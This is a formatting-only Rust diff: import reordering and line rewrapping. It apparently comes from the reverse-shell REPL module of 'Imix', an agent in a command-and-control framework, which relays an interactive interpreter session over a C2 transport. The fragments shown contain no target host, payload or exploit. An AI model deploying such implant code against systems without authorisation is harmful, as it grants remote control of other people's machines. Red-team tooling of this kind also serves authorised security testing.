@@ -2,15 +2,15 @@ use std::io::{BufWriter, Write};
 use std::sync::Arc;
 
 use crate::agent::ImixAgent;
-use crossterm::{cursor, terminal, QueueableCommand};
+use crossterm::{QueueableCommand, cursor, terminal};
 use eldritch::agent::agent::Agent;
 use eldritch::assets::std::EmptyAssets;
 use eldritch::repl::{Repl, ReplAction};
 use eldritch::{Interpreter, Printer, Span, Value};
 use pb::c2::{
-    report_output_request, reverse_shell_request, ReportOutputRequest,
-    ReportShellTaskOutputMessage, ReportTaskOutputMessage, ReverseShellMessageKind,
-    ReverseShellRequest, ShellTaskOutput, TaskError, TaskOutput,
+    ReportOutputRequest, ReportShellTaskOutputMessage, ReportTaskOutputMessage,
+    ReverseShellMessageKind, ReverseShellRequest, ShellTaskOutput, TaskError, TaskOutput,
+    report_output_request, reverse_shell_request,
 };
 use transport::Transport;
 
@@ -27,9 +27,7 @@ struct VtWriter<T: Transport> {
 impl<T: Transport> Write for VtWriter<T> {
     fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
         let context_val = match &self.context {
-            Context::Task(tc) => {
-                Some(reverse_shell_request::Context::TaskContext(tc.clone()))
-            }
+            Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
             Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(
                 stc.clone(),
             )),
@@ -74,7 +72,11 @@ impl Printer for StreamPrinter {
     }
 }
 
-fn render<W: Write>(writer: &mut W, repl: &Repl, previous_buffer: Option<&str>) -> std::io::Result<()> {
+fn render<W: Write>(
+    writer: &mut W,
+    repl: &Repl,
+    previous_buffer: Option<&str>,
+) -> std::io::Result<()> {
     // Basic rendering implementation
     // This is simplified and assumes vt100 compatibility on the other end
 
@@ -111,7 +113,9 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
 
     let context_val = match &context {
         Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
-        Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(stc.clone())),
+        Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(
+            stc.clone(),
+        )),
     };
 
     // First, send an initial registration message
